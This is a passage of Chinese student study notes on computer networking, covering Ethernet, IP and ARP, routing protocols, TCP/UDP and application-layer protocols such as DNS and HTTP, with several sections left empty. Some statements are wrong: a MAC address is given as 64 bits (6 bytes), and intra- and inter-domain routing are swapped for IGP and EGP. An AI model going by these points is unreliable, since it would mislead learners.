<p>而在争用期如果发生碰撞则双方都需要进行重传操作，而以太网使用的确定重传时间的方法称为<strong>截断二进制指数退避算法；</strong></p>
<p>这是一种动态退避算法，在争用期（具体为51.2μs）内可传送512bit，即64字节，所以发生碰撞的时间就在站点发送512bit的时间内（也就是说，如果站点在发送一个完整的512字节的过程中没有检测到碰撞信号，则说明以后的发送都不会发生碰撞，可以完整的发送完整个数据帧）</p>
<p>具体的算法原理在这就不详细说明了，在<strong>动态退避</strong>的过程中，为了使所有的站点发送的每一个数据帧逗都能保证得到想要的发送结果信息（是否发生碰撞），则规定一个数据帧的最小长度应该为512bit，这样，每个站点在发送所有的数据帧时都能够在发送完之前知道是否发生了碰撞，是否需要重传（如果小于最小帧长64字节，则有可能在完全发送完之后才发生碰撞，这样发送站点就不知道发生了碰撞，即不会重传该帧），因此，在以太网中多点信道中，凡长度小于64 字节的帧都是由于冲突而发生异常终止的无效帧，在接收站点的适配器中即可方便判断出该结果；</p>
<p><strong>规定帧间最小间隔9.6μs</strong>，是为了使刚刚收到数据帧站点能够有时间对手的数据帧作出反应</p>
<p><strong>强化碰撞</strong></p>
<p>  ——在发生碰撞之后除了立即停止发送数据之外，还要发送32bit或48bit 的人为干扰信号，目的是为了能够让所有站点都知道发生了碰撞</p>
<h2 id="使用集线器的星形拓扑结构"><a href="#使用集线器的星形拓扑结构" class="headerlink" title="使用集线器的星形拓扑结构"></a>使用集线器的星形拓扑结构</h2><p>双绞线以太网的出现，是局域网发展史上的一个重要的里程碑</p>
<p>集线器的特点：<br>集线器使用电子器件模拟实际电缆线的工作，所以使用集线器的以太网在逻辑上还是一个总线网，各站逻辑上共享总线。而且是用的还是协议；</p>
<p>集线器的接口通过两对双绞线与计算机上的适配器相连；一个集线器像是一个多接口的转发器；</p>
<p>集线器工作在物理层，每个接口只简单地转发比特，不进行碰撞检测，</p>
<p>集线器采用专门的芯片，进行自适应串音回波抵消；（使得同一接口的强信号不会对弱信号产生干扰）</p>
<h2 id="MAC层的硬件地址"><a href="#MAC层的硬件地址" class="headerlink" title="MAC层的硬件地址"></a>MAC层的硬件地址</h2><p>硬件地址又称为物理地址或MAC地址</p>
<p>硬件地址其实不算严格意义上的地址，因为并没有指明具体位置，硬件地址是适配器唯一编号，用来唯一的标识每台电脑上的适配器</p>
<p>硬件地址在适配器生产时固化在适配器的ROM中；</p>
<p><strong>MAC地址的格式</strong></p>
<p>总共64位（6字节）前三字节由管理全球硬件地址的机构——注册管理机构RA向适配器制造公司出售称为<strong>组织唯一标识符OUI</strong>，后三字节由制造公司自行分配，称为扩展标识符，（其中前三字节中有两位是用来标识是否位单播地址和是否属于全球管理的）</p>
<h2 id="MAC帧的格式"><a href="#MAC帧的格式" class="headerlink" title="MAC帧的格式"></a>MAC帧的格式</h2><p><img src="https://img.npfs06.top/20210319123436.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>目的地址和源地址指的是硬件地址</p>
<p>类型字段用来标志上层使用的是什么协议</p>
<p>FCS帧检验序列，使用CRC检验</p>
<p>前同步码是为了使适配器的时钟与比特流达成同步；</p>
<p>同时我们要注意的是在MAC帧中并没有数据长度的标识，但由于传输时使用的是曼彻斯特编码的方式，所以通过对曼彻斯特编码的信号特点的观察便可确定是否传送完毕；（曼彻斯特编码信号的码元正中间有一次电压转换）以太网的扩展</p>
<p><strong>在物理层扩展以太网</strong></p>
<p><strong>在数据链路层扩展以太网</strong></p>
<p>通过网桥扩展以太网</p>
<p>通过以太网交换机扩展</p>
<p>虚拟局域网</p>
<h1 id="第四章-网络层"><a href="#第四章-网络层" class="headerlink" title="第四章 网络层"></a>第四章 网络层</h1><p><img src="https://img.npfs06.top/20210315125126.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h2 id="重要内容-2"><a href="#重要内容-2" class="headerlink" title="重要内容"></a>重要内容</h2><p>虚拟互联网的概念</p>
<p>IP地址与物理地址的关系</p>
<p>传统的分类的IP地址（包括子网掩码）和无分类域间路由选择CIDR</p>
<p>路由选择协议的工作方式</p>
<h2 id="网络层提供的两种服务"><a href="#网络层提供的两种服务" class="headerlink" title="网络层提供的两种服务"></a>网络层提供的两种服务</h2><p>　面向连接和无连接的传送服务</p>
<p>在互联网中，网络层向上只提供简单灵活的，无连接的，<strong>尽最大努力交付</strong>的数据报服务</p>
<p>即网络层不提供服务质量的承诺</p>
<h2 id="网际协议IP"><a href="#网际协议IP" class="headerlink" title="网际协议IP"></a>网际协议IP</h2><p>三个协议</p>
<p>地址解析协议ARP</p>
<p>网际报文管理协议ICMP</p>
<p>网际组织管理协议IGMP</p>
<p>这三种协议与IP协议的关系___________</p>
<p><img src="https://img.npfs06.top/20210319123459.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><strong>虚拟互联网络的概念</strong></p>
<p>**___即逻辑互联网络,忽略物理层的客观异构性,**在网络层看起来好像是一个统一的网络,即互联网可以有多种异构的网络组成</p>
<p>网络互联的一些中间设备_</p>
<p>物理层:转发器</p>
<p>数据链路层:网桥</p>
<p>网络层:路由器</p>
<p>网络层以上:网关</p>
<h2 id="分类的IP地址"><a href="#分类的IP地址" class="headerlink" title="分类的IP地址"></a>分类的IP地址</h2><p>IP地址的概念:<br>用来唯一标识全球连接在互联网上的主机的接口的标识符</p>
<p>IP地址的划分方式历史:<br>分类的IP地址</p>
<p>划分子网</p>
<p>构成超网</p>
<p><strong>分类的IP地址</strong></p>
<p><img src="https://img.npfs06.top/20210319123527.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>IP地址前几位为类位别，标明该IP地址属于哪类</p>
<p>IP地址的<strong>点分十进制表示法——</strong>把IP地址的每八位用十进制表示，便于记忆书写</p>
<p>常用的三类IP地址：</p>
<p><strong>本网络</strong>：A类地址中网络号全为0的IP地址</p>
<p>环回测试：A类地址中网络号为01111111的IP地址用作本地软件<strong>环回测试</strong>本主机的进程之间的通道</p>
<p><strong>路由器仅根据目的主机IP地址中的网络号来转发分组</strong></p>
<p>实际IP地址是主机与网络链路之间的一条链路的标识（一个主机连接在两个不同的网络上时，该主机对应的就有两个IP地址）</p>
<p>一个网络是指具有相同网络号的主机的集合，<strong>因此用网桥或转发器连接起来的若干局域网属于同一个网络</strong></p>
<p>互联网上的网络号都是平等的，与其范围大小没有关系</p>
<p><strong>无名网络</strong>：两个路由器直接相连时并不分配IP地址，这两个路由器之间的网络称为无名网络，或无编号网络</p>
<p><strong>IP地址与硬件地址</strong></p>
<p>硬件地址时物理层和数据链路层使用的地址</p>
<p>IP地址是IP数据报在网络层及以上各层使用的一种逻辑地址</p>
<p>MAC帧中的源地址和目的地址都是硬件地址，整个IP数据报在物理层被封装在数据部分，IP地址对数据链路层不可见</p>
<p>数据报在路由其之间传送时，途径的路由器地址不出现在IP数据报中，当前路由器根据目的IP地址自主路由出下一路由器地址</p>
<p>分组每次经过路由器转发时都要将MAC的首部和尾部丢弃重新封装——<strong>变换MAC帧中的目的地址和源地址</strong></p>
<h2 id="地址解析协议ARP"><a href="#地址解析协议ARP" class="headerlink" title="地址解析协议ARP"></a>地址解析协议ARP</h2><p>ARP协议:根据已知的IP地址解析出该主机的硬件地址;</p>
<p>RARP协议:根据硬件地址解析出该主机对应的IP地址</p>
<p>**主机ARP高速缓存:**用来存放从IP地址映射硬件地址的映射表,并且动态更新(方法:新增或超时删除)这个映射表;</p>
<p>新增的方法:</p>
<p>通过向本局域网内所有的主机发送ARP请求分组,在得到响应分组后便将这个目的主机的硬件地址写入ARP高速缓存中</p>
<p>同时,ARP高速缓存中对每个硬件地址都设置了生存时间,超过生存时间的硬件地址便进行删除操作,便于进行动态更新,防止出现发送到错误(过时的)硬件地址处;</p>
<p>注意：<strong>地址解析协议ARP只能用来解决同一个局域网（包括该网络和与该网络相连的路由器）内的地址映射，网络之间的路由并能不能做到；</strong></p>
<p>从硬件地址到IP地址的解析每次转发分组时都要重复进行，但这种开销是不可避免的，是为方便的在各种异构网络之间进行转发工作而屏蔽网络硬件之间的异构性，从而体现出虚拟网络的含义；</p>
<h2 id="IP数据报的格式"><a href="#IP数据报的格式" class="headerlink" title="IP数据报的格式"></a>IP数据报的格式</h2><p><img src="https://img.npfs06.top/20210319123542.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>其中，</p>
<p>首部检验和</p>
<p>首部检验和的作用：用于检验数据报在传送的过程中其首部是否出错；</p>
<p>检验方法：在发送方将IP数据报的首部划分为许多16位的字序列；并把检验和字段置零，用反码运算术将字相加之后，将得到的和的反码写入检验和位置；在接受方接收到数据报之后，使用相同的方法将首部所有的字（包括检验和）相加一次，若没有出错则，得到的结果必然为零，最后的结果便可作为是否出错的判断标志；</p>
<p>反码求和：0+0=0；0+1=1；1+1=0，同时产生进位；最高位产生进位时最后的结果加+1；</p>
<h2 id="划分子网"><a href="#划分子网" class="headerlink" title="划分子网"></a>划分子网</h2><h2 id="构造超网"><a href="#构造超网" class="headerlink" title="构造超网"></a>构造超网</h2><h2 id="网际控制报文协议ICMP"><a href="#网际控制报文协议ICMP" class="headerlink" title="网际控制报文协议ICMP"></a>网际控制报文协议ICMP</h2><p>为更有效的转发IP数据报并提高交付成功的机会</p>
<p>ICMP数据报装在IP数据报中，作为其数据部分出现</p>
<p><img src="https://img.npfs06.top/20210319123556.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>ICMP数据报有两种：<strong>ICMP差错报告报文</strong>和<strong>ICMP询问报文</strong></p>
<p><strong><img src="https://img.npfs06.top/20210319123611.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></strong></p>
<p>改变路由报文：（<strong>重定向）</strong>——互联网主机中也存在路由表，但主机中的路由表并不实时更新，（不和路由器定期交换路由信息），所以主机中的路由表更新的方法就是主机通过接收这种<strong>来自路由器的</strong>改变路由报文来更新其路由表；</p>
<p>ICMP的应用——PING（分组网间探测）：用来测试两台主机之间的连通性</p>
<p>​                           用在UNIX操作系统中用来跟踪一个分组从源点到终点的路径</p>
<h2 id="互联网的路由选择协议"><a href="#互联网的路由选择协议" class="headerlink" title="互联网的路由选择协议"></a>互联网的路由选择协议</h2><p><strong>1，理想的路由算法</strong></p>
<p><strong>2，分层次的路由选择协议：</strong>减少路由器之间的路由信息量；保密</p>
<p><strong>3，自治系统AS：</strong>在单一技术管理下的一组路由器（一个AS对其他AS表现出的是<strong>一个单一的和一致的路由选择策略</strong>）</p>
<p><strong>4，两种路由选择协议——</strong></p>
<p>  <strong>内部网关协议IGP：</strong>在自治系统<strong>内部</strong>使用的路由选择协议，<strong>域间路由选择</strong>，有多种，如RIP，OSPF</p>
<p>  <strong>外部网关协议EGP：</strong>在自治系统<strong>之间</strong>使用的路由选择协议，<strong>域内路由选择，</strong>目前使用的是BGP协议</p>
<h2 id="内部网关协议RIP"><a href="#内部网关协议RIP" class="headerlink" title="内部网关协议RIP"></a>内部网关协议RIP</h2><p><strong>1）工作原理</strong></p>
<p>是一种<strong>分布式</strong>的基于<strong>距离向量</strong>的路由选择协议</p>
<p>分布式：每个路由器不断地和<strong>相邻</strong>路由器交换信息；(所交换的式当前路由器知道的所有路由信息)</p>
<p>距离向量：从当前路由器每经过一个路由器则距离加一；记录到达每个路由器的距离，以找出最小距离；</p>
<p><strong>2）距离向量算法</strong></p>
<p><strong>3）RIP协议的报文格式</strong></p>
<p>RIP2可以支持变长子网掩码和无分类域间路由选择CIDR</p>
<p>RIP2的报文格式</p>
<p><img src="https://img.npfs06.top/20210319123631.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>（RIP报文通过运输层的用户数据报UDP传送，使用UDP端口520）</p>
<p><strong>特点：好消息传播的快。坏消息传播的慢</strong></p>
<h2 id="内部网关协议OSPF"><a href="#内部网关协议OSPF" class="headerlink" title="内部网关协议OSPF"></a>内部网关协议OSPF</h2><p><strong>1，OSPF的基本特点</strong></p>
<p><strong>开放最短路径优先——</strong>为克服RIP协议制定的协议</p>
<p>使用了<strong>Dijkstra的最短路径算法；（</strong>最短路径算法详见博文<strong>：）</strong></p>
<p><strong>特征：</strong>并不表示其他的路由选择协议不是最短路径优先；（实际上所有在自治系统内的路由选择协议都是要找一条最短路径）</p>
<p>使用分布式的<strong>链路状态协议，</strong></p>
<p><strong>2，洪范法：</strong></p>
<p><strong>路由器通过所有的端口向所有的相邻路由器发送信息，而所有的相邻路由器也是同样的做法，（但发送的对象不包括之前向他发送信息的那个路由器），从而最终使得整个局域网都得到该信息的一个副本，</strong></p>
<p>而发送的信息就是与本路由器<strong>相邻的</strong>所有路由器的链路状态（链路状态是指相邻路由器及到达该路由器的<strong>代价</strong>）</p>
<p>只有链路状态发生变化时，才使用洪范法发送信息，（不是定期交换）</p>
<h2 id="外部网关协议BGP"><a href="#外部网关协议BGP" class="headerlink" title="外部网关协议BGP"></a>外部网关协议BGP</h2><p>外部网关协议用来解决<strong>不同自治系统之间</strong>的路由选择策略；</p>
<p>边界网关协议不追求寻找最佳路径，而是在可到达的基础上找到一条相对较好的路径；</p>
<p>BGP发言人：在BGP协议中，一个自治系统中用来与其他自治系统（通过TCP连接）交换路由信息的路由器；</p>
<p>交换信息的两个BGP发言人彼此成为临站或对等站</p>
<p>所交换的信息是可达性信息、</p>
<p>每个发言人除了要运行BGP协议外，还要运行本自治系统内部的协议；路由器的构成</p>
<h2 id="路由器的结构"><a href="#路由器的结构" class="headerlink" title="路由器的结构"></a>路由器的结构</h2><p>两部分——路由选择部分 和 分组转发部分</p>
<p><img src="https://img.npfs06.top/20210319123646.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>路由选择部分：</p>
<p>控制部分，核心是<strong>路由选择处理机，</strong>路由选择处理机的作用是构造路由表，同时定期更新维护路由表路由表；</p>
<p>分组转发部分：</p>
<p>由三部分组成——输入输出端口，交换结构</p>
<p>交换结构的工作是将收到的分组根据路由表从输入端口转发到输出端口；</p>
<p>三种转发方法：</p>
<p>1）通过存储器进行交换</p>
<p>2）通过总线进行交换</p>
<p>3）通过纵横交换结构（总线网）进行交换</p>
<h2 id="IPv6"><a href="#IPv6" class="headerlink" title="IPv6"></a>IPv6</h2><h2 id="从IPv4向IP-v6的过渡"><a href="#从IPv4向IP-v6的过渡" class="headerlink" title="从IPv4向IP v6的过渡"></a>从IPv4向IP v6的过渡</h2><p><strong>双栈协议</strong></p>
<p><strong>隧道技术</strong></p>
<h2 id="IP多播"><a href="#IP多播" class="headerlink" title="IP多播"></a>IP多播</h2><p>基本概念：<br>多播即一对多的通信</p>
<p>多播组的IP地址为D类IP地址；（多播地址只能用来当作目的地址，不能用作源地址）</p>
<p><strong>1，在局域网上进行硬件多播</strong></p>
<p>多播组的MAC地址：</p>
<p>是由MAC地址和D类IP地址的后23位拼接起来的；</p>
<p><strong>IGMP协议</strong></p>
<p>网际组管理协议</p>
<p>是让连接在本地局域网上的多播路由器知道在本局域网上有多少主机接入或退出了多播组</p>
<p>多播组协议的特点：</p>
<p>多播转发必须动态地适应多播组成员的变化</p>
<p>多播路由器在转发多播数据报时，不能进根据数据包中的目的地址来转发数据报，还要知道数据报的来源（多播组内的成员发送信息时，就不用再向该成员转发数据报）</p>
<p>多播成员或非多播成员均可发送多播数据报</p>
<p>IGMP协议的功能：</p>
<p>2，网际组管理协议IGMP</p>
<p>3，多播路由选择协议</p>
<h2 id="虚拟专用网VPN"><a href="#虚拟专用网VPN" class="headerlink" title="虚拟专用网VPN"></a>虚拟专用网VPN</h2><h2 id="网络地址转换NAT"><a href="#网络地址转换NAT" class="headerlink" title="网络地址转换NAT"></a>网络地址转换NAT</h2><h1 id="第五章-运输层"><a href="#第五章-运输层" class="headerlink" title="第五章 运输层"></a>第五章 运输层</h1><p><img src="https://img.npfs06.top/20210315125159.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h2 id="重要内容-3"><a href="#重要内容-3" class="headerlink" title="重要内容"></a>重要内容</h2><p>运输层的作用</p>
<p>端口和套接字的意义</p>
<p>无连接的UDP的特点</p>
<p>面向连接的TCP的特点</p>
<p>在不可靠网络上时先可靠传输的原理</p>
<p>TCP的滑动窗口，流量控制，拥塞控制和连接管理</p>
<h2 id="运输层协议概述"><a href="#运输层协议概述" class="headerlink" title="运输层协议概述"></a>运输层协议概述</h2><p>运输层用来解决进程之间的通信问题，属于面向通信部分的最高层</p>
<p>运输层向用户屏蔽了下面网络核心的细节；</p>
<p>为了能够满足同一主机的不同进程间的通信要求，运输层需要一个很重要的功能——<strong>分用与复用</strong>（分用指<strong>发送方</strong>不同进程可以使用同一运输协议进行发送数据报。分用指接收方的运输层可以将接收到的数据报正确交付给不同的进程）</p>
<p><strong>运输层还要对从网络层收到的数据报进行差错检测，（IP数据包中的首部中的检验和字段只是对首部进行检查，并不对数据部分进行检查）</strong></p>
<p>运输层的两个主要协议：　用户数据报协议UDP——无连接</p>
<p>　　　　　　　　　　　　传输控制协议TＣＰ——面向连接</p>
<h2 id="运输层的端口"><a href="#运输层的端口" class="headerlink" title="运输层的端口"></a>运输层的端口</h2><p>端口是指软件端口,是应用层的各种协议<strong>进程与运输实体</strong>进行层间交互的一种地址</p>
<p>(数据报在网络上运输的终点),主机通过端口将数据报分发给不同的进程;</p>
<p>端口号只具有本地意义,是为了标志本计算机中各个进程在和运输层交互时的层间接口(不同计算机中相同的端口是没有任何关联的)</p>
<p>TCP/IP协议中,在运输层用16位端口号来标志一个端口,一个主机总共有65535个端口,</p>
<p><strong>服务器使用的端口号</strong></p>
<p><strong>客户端使用的端口号</strong></p>
<h2 id="用户数据报协议UDP"><a href="#用户数据报协议UDP" class="headerlink" title="用户数据报协议UDP"></a><strong>用户数据报协议UDP</strong></h2><p><strong>UDP概述</strong></p>
<p><strong>特点:</strong></p>
<p>无连接,</p>
<p>尽最大努力交付;</p>
<p>面向报文</p>
<p>没有拥塞控制</p>
<p>支持一对一,多对多,多对一,一对多的交互通信</p>
<p>首部开销小</p>
<p><strong>UDP的首部格式</strong></p>
<p><strong><img src="http://img.npfs06.top/20210319123706.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></strong></p>
<h2 id="传输控制协议TCP"><a href="#传输控制协议TCP" class="headerlink" title="传输控制协议TCP"></a>传输控制协议TCP</h2><p><strong>特点:</strong></p>
<p>面向连接的运输层协议</p>
<p>点对点连接</p>
<p>可靠交付</p>
<p>提供全双工通信</p>
<p>面向字节流(UDP面向数据报)</p>
<p><strong>TCP的面向连接</strong></p>
<p><strong>每一条TCP连接只有两个端点_套接字</strong></p>
<p>套接字=(IP地址:端口号)</p>
<p>(同一个端口号和同一个IP地址均可有多个TCP连接)</p>
<h2 id="可靠传输的原理"><a href="#可靠传输的原理" class="headerlink" title="可靠传输的原理"></a>可靠传输的原理</h2><p>TCP在不可靠传输的网络层之上提供可靠传输的服务,必须采取相关的措施</p>
<p><strong>1.停止等待协议</strong></p>
<p>分组发送之后必须暂时保留该分组的副本</p>
<p>每个分组进行编号</p>
<p>发送确认</p>
<p>超时重传</p>
<p><strong>TCP报文段的首部格式</strong></p>
<p><img src="https://img.npfs06.top/20210319123721.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>TCP传送的数据单元是报文段</p>
<p>检验和字段检验的包括首部和数据部两部分</p>
<p>窗口指的是发送方的接收窗口，窗口值的意义：从本报文段首部中的确认号算起，接收方<strong>目前</strong>允许对方发送的数据量；（窗口值是不断动态变化的）（<strong>动态确认机制</strong>）</p>
<h2 id="TCP可靠传输的实现"><a href="#TCP可靠传输的实现" class="headerlink" title="TCP可靠传输的实现"></a>TCP可靠传输的实现</h2><p> <strong>1，以字节为单位的滑动窗口——连续ARQ协议</strong></p>
<p>发送窗口：发送窗口内的数据的可连续的发送出去，而不需要等待对方的确认（从而提高信道利用率）</p>
<p>滑动窗口：发送方每收到一个接受确认，就将发送窗口的向前滑动一个字节的位置；</p>
<p>接收方采用<strong>积累确认</strong>的方式（对有序的几个分组只确认最后一个分组）</p>
<p>TCP的滑动窗口是以字节为单位的；</p>
<p><strong>2，超时重传的时间选择</strong></p>
<p><strong>3，选择确认SACK</strong></p>
<h2 id="TCP的流量控制"><a href="#TCP的流量控制" class="headerlink" title="TCP的流量控制"></a><strong>TCP的流量控制</strong></h2><h2 id="TCP的拥塞控制"><a href="#TCP的拥塞控制" class="headerlink" title="TCP的拥塞控制"></a><strong>TCP的拥塞控制</strong></h2><p><strong>拥塞：在某段时间，若对网络中的资源需求超过了该资源所能提供的可用部分，使得网络的性能变坏；（资源包括——链路容量，交换节点中的缓存，处理机）</strong></p>
<p><strong>TCP的拥塞控制方法</strong></p>
<p><strong>慢开始</strong></p>
<p><strong>拥塞避免</strong></p>
<p><strong>快重传</strong></p>
<p><strong>快恢复</strong></p>
<h2 id="TCP的运输连接管理"><a href="#TCP的运输连接管理" class="headerlink" title="TCP的运输连接管理"></a><strong>TCP的运输连接管理</strong></h2><p>运输连接管理的目的是为了使运输连接的建立和释放都能够正常的进行</p>
<h1 id="第六章-应用层"><a href="#第六章-应用层" class="headerlink" title="第六章 应用层"></a>第六章 应用层</h1><p><img src="https://img.npfs06.top/20210315125227.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h2 id="本章概述"><a href="#本章概述" class="headerlink" title="本章概述"></a>本章概述</h2><p>数据传输的终点是主机进程，而网络通信的目的是为了给应用提供服务；本章中的各应用层协议主要讲述了各应用的进程是如何在主机中完成通信工作的；</p>
<h2 id="重要内容-4"><a href="#重要内容-4" class="headerlink" title="重要内容"></a>重要内容</h2><p>域名系统DNS</p>
<p>万维网和HTTP协议，万维网两种不同的搜索引擎</p>
<p>电子邮件的传送过程</p>
<p>动态主机配置协议DCHP</p>
<p>网络管理的三个组成部分</p>
<p>P2P文件系统</p>
<h2 id="域名系统DNS"><a href="#域名系统DNS" class="headerlink" title="域名系统DNS"></a>域名系统DNS</h2><p><strong>概述</strong></p>
<p>域名系统是为了使对用户来说32位的IP地址更加容易记忆和使用而选择的一种映射方式；</p>
<p>应用层软件一般直接使用的是域名而非IP地址，在网络层进行数据传输时才将域名转化为路由中使用的IP地址；</p>
<p>互联网的域名结构是层次结构的，用户通过<strong>域名服务器</strong>将域名转化为IP地址供网络层使用</p>
<p>DNS被设计成一个联机分布式的数据库系统，并采用客户服务器方式；</p>
<p>DNS中大部分域名都在本地进行解析，只有少数域名需要在互联网上进行解析；</p>
<p><strong>互联网的域名结构</strong></p>
<p><strong>采用层次树状命名结构</strong>；域名由标号组成；</p>
<p>每一个标号不超过63个字符；标号不区分大小写；完整的域名不超过255个字符；</p>
<p>域名的等级结构：</p>
<p>顶级域名：</p>
<p>1）国家顶级域名</p>
<p>2）通用顶级域名</p>
<p>3）基础结构域名</p>
<p>二级域名由顶级域名组织自行划分</p>
<p><strong>域名服务器</strong></p>
<p>域名管理范围采用划分<strong>区</strong>的方法；一个域名服务器所管辖的范围叫做区；</p>
<p>一个区中的界点必须连通；每个区设置相应的权限域名服务器；</p>
<p>域名服务器的层次划分：</p>
<p>根域名服务器</p>
<p>顶级域名服务器</p>
<p>权限域名服务器‘</p>
<p>本地域名服务器</p>
<p>主机向本地域名服务器采用<strong>递归查询</strong>的方法</p>
<p>本地域名服务器向根域名服务器采用<strong>迭代查询</strong>的方法；</p>
<p>同时，为了提高查询效率，减少查询时的网络开销，在每级域名服务器中都采用的高速缓存来存储经常或最近被查询的到的域名对应的IP地址</p>
<h2 id="文件传送协议FTP"><a href="#文件传送协议FTP" class="headerlink" title="文件传送协议FTP"></a>文件传送协议FTP</h2><p>基于TCP的FTP协议</p>
<p>主要功能：减少或消除在不同操作系统下处理文件的不兼容性，（包括文件的控制方式，命名方式等）</p>
<p>特点：属于文件共享协议；联机访问；</p>
<p>基本原理：</p>
<p>使用客户服务启方式；服务器中分为两大进程：<strong>主进程</strong>用来接收请求消息；接收到文件传送消息之后启动<strong>若干从属进程</strong>处理消息；主进程仍然处于等待状态；</p>
<p>主进程和从属进程并发进行的；</p>
<p>在数据传送过程中，启动两个从属进程：<strong>控制进程和数据传送进程</strong>；其中控制进程用来传送数据传送过程中产生的控制信息；数据传送进程传送数据；同时建立两条连接：控制连接（２１号端口）和数据传送连接（２０号端口）；</p>
<p>基于UDP的TFTP协议</p>
<p><strong>简单文件传送协议；</strong>使用UDP数据报进行传送；只支持传输不支持交互；</p>
<p>主要特点：</p>
<p>１）每次传送的报文大小为５１２字节，（最后一个报文可不足５１２字节），并在最后一个字节中设置结束服标志；</p>
<p>２）数据报文进行编号；（从１开始）</p>
<p>３）支持ＡＳＣＩＩ　码或二进制传送</p>
<p>４）可对文件进行读或写；</p>
<p>５）使用简单的首部</p>
<p>６）每次发送完一个UDP之后要进行确认；</p>
<h2 id="远程终端协议TELNET"><a href="#远程终端协议TELNET" class="headerlink" title="远程终端协议TELNET"></a>远程终端协议TELNET</h2><p>作用：提供远程终端控制与访问操作；即通过互联网对远程终端进行访问控制；能够适应许多计算机和操作系统的差异;</p>
<p>将不同计算机操作系统上产生的控制信息转化成统一的格式网络上进行传送,然后转化成本地计算机需的格式;</p>
<h2 id="万维网WWW"><a href="#万维网WWW" class="headerlink" title="万维网WWW"></a>万维网WWW</h2><p>万维网是一个大规模的,联机式的信息储藏所;</p>
<p>使用的统一资源定位符URL来唯一的标识万维网中的各种文档位置;</p>
<p>万维网是一个分布式的超媒体系统;(是超文本系统的扩展)</p>
<p>万维网使用连接的方法进行站点之间的访问;</p>
<p>万维网以客户服务器的方式工作:客户向服务器发出访问请求,然后服务器将万维网文档发送给客户端;客户端即运行在主机中的浏览器;</p>
<p>在一个客户程序主窗口中显示的万维网文档称为页面;</p>
<p>万维网使用超文本传送协议HTTP进行文档传输工作;</p>
<p>万维网使用超文本标记语言HTML描述万维网页面;</p>
<p>URL的格式:<br>&lt;协议&gt;://&lt;主机(主机的域名)&gt;:&lt;端口&gt;/&lt;路径&gt;</p>
<p>常用的协议:http协议,ftp协议</p>
<p>路径:是指文档文件在主机中的位置</p>
<p><strong>超文本传送协议HTTP</strong></p>
<p><strong>HTTP是面向事务</strong>的应用层协议,规定了浏览器怎样向万维网服务器请求万维网文档;以及服务器怎样将文档传送给浏览器;</p>
<p>HTTP协议使用面向连接的TCP协议作为运输层协议保证了传输的可靠性;</p>
<p><strong>代理服务器</strong>:又称为万维网高速缓存;将最近的一些请求及其响应存储在代理服务器的本地磁盘中,避免了近期有相同请求时再次访问网络;</p>
<p>将很大一部分同信活动局限在局域网内部;</p>
<p>HTTP的保报文结构:</p>
<p>两类报文:请求报文和响应报文</p>
<p><img src="https://img.npfs06.top/20210319123740.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>在服务器上存放用户的信息______使用cookie</p>
<h2 id="万维网的文档"><a href="#万维网的文档" class="headerlink" title="万维网的文档"></a>万维网的文档</h2><p><strong>超文本标语言HTML</strong></p>
<p><strong>动态万维网文档</strong></p>
<p><strong>活动万维网文档</strong></p>
<p>当浏览器请求万维网文档时,服务器将返回给浏览器一段活动文档的程序副本,使程序副本在客户端运行,</p>
<h2 id="万维网的信息检索"><a href="#万维网的信息检索" class="headerlink" title="万维网的信息检索"></a><strong>万维网的信息检索</strong></h2><p><strong>全文检索</strong></p>
<p><strong>分类目录检索</strong></p>
<h2 id="动态主机配置协议"><a href="#动态主机配置协议" class="headerlink" title="动态主机配置协议"></a>动态主机配置协议</h2><p>即插即用联网</p>
